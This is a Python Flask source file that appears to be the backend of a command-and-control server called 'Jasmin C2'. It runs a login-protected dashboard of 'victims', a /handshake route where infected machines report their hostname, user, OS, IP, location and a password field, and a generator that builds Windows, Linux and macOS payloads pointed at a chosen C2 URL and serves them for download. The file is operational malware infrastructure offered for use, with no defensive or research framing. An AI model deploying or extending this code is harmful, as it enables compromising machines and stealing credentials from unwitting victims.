#!/usr/bin/env python3
"""Jasmin C2 — Python Flask Backend"""
import os, secrets, hashlib, datetime, shutil
from functools import wraps
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///jasmin.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['HANDSHAKE_SECRET'] = os.environ.get('HANDSHAKE_SECRET', 'jasmin@123')

db = SQLAlchemy(app)
PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), 'payloads')
TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), 'templates', 'payloads')
os.makedirs(PAYLOAD_DIR, exist_ok=True)

# ── Models ──
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(255), unique=True, nullable=False)
    password = db.Column(db.String(255), nullable=False)

class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_name = db.Column(db.String(255))
    computer_user = db.Column(db.String(255))
    os = db.Column(db.String(100))
    date = db.Column(db.String(100))
    time = db.Column(db.String(50))
    ip = db.Column(db.String(45))
    location = db.Column(db.String(255))
    systemid = db.Column(db.String(255))
    password = db.Column(db.String(255))
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kw):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kw)
    return decorated

# ── Routes: Auth ──
@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET','POST'])
def login():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        u = request.form.get('username','')
        p = request.form.get('password','')
        admin = Admin.query.filter_by(username=u).first()
        if admin and check_password_hash(admin.password, p):
            session['username'] = admin.username
            return redirect(url_for('dashboard'))
        flash('Access Denied','error')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ── Routes: Dashboard ──
@app.route('/dashboard')
@login_required
def dashboard():
    page = request.args.get('pageno', 1, type=int)
    search = request.args.get('search', '').strip()
    per_page = 10
    q = Victim.query
    if search:
        like = f'%{search}%'
        q = q.filter(db.or_(
            Victim.machine_name.like(like), Victim.computer_user.like(like),
            Victim.os.like(like), Victim.ip.like(like),
            Victim.location.like(like), Victim.systemid.like(like)))
    total = q.count()
    victims = q.order_by(Victim.id.desc()).offset((page-1)*per_page).limit(per_page).all()
    total_pages = max(1, -(-total // per_page))
    return render_template('dashboard.html', victims=victims, page=page,
        total_pages=total_pages, total=total, search=search)

# ── Routes: Handshake (victim callback) ──
@app.route('/handshake', methods=['POST'])
def handshake():
    if request.form.get('handshake') != app.config['HANDSHAKE_SECRET']:
        return 'Invalid', 403
    v = Victim(
        machine_name=request.form.get('machine_name',''),
        computer_user=request.form.get('computer_user',''),
        os=request.form.get('os',''),
        date=request.form.get('date',''),
        time=request.form.get('time',''),
        ip=request.form.get('ip', request.remote_addr),
        location=request.form.get('location',''),
        systemid=request.form.get('systemid',''),
        password=request.form.get('password',''))
    db.session.add(v)
    db.session.commit()
    return 'handshake completed'

# ── Routes: Payload Generator ──
@app.route('/generate', methods=['POST'])
@login_required
def generate():
    plat = request.form.get('platform','')
    c2 = request.form.get('c2_url','')
    secret = request.form.get('secret', app.config['HANDSHAKE_SECRET'])
    if plat not in ('win','linux','macos'):
        return jsonify(ok=False, msg='Invalid platform')
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    tok = secrets.token_hex(4)
    tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl'}
    ext_map = {'win':'.cs','linux':'.py','macos':'.py'}
    tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
    if not os.path.exists(tpl_path):
        return jsonify(ok=False, msg='Template not found')
    tpl = open(tpl_path).read()
    tpl = tpl.replace('{{C2_URL}}', c2).replace('{{HANDSHAKE}}', secret)
    name = f'jasmin_{plat}_{ts}_{tok}{ext_map[plat]}'
    out = os.path.join(PAYLOAD_DIR, name)
    with open(out, 'w') as f:
        f.write(tpl)
    return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(out))

@app.route('/payloads/<path:filename>')
@login_required
def download_payload(filename):
    return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)

# ── Init DB + default admin ──
def init_db():
    db.create_all()
    if not Admin.query.first():
        pw = os.environ.get('ADMIN_PASSWORD', 'ChangeMe!2024')
        db.session.add(Admin(username='admin', password=generate_password_hash(pw)))
        db.session.commit()

if __name__ == '__main__':
    with app.app_context():
        init_db()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
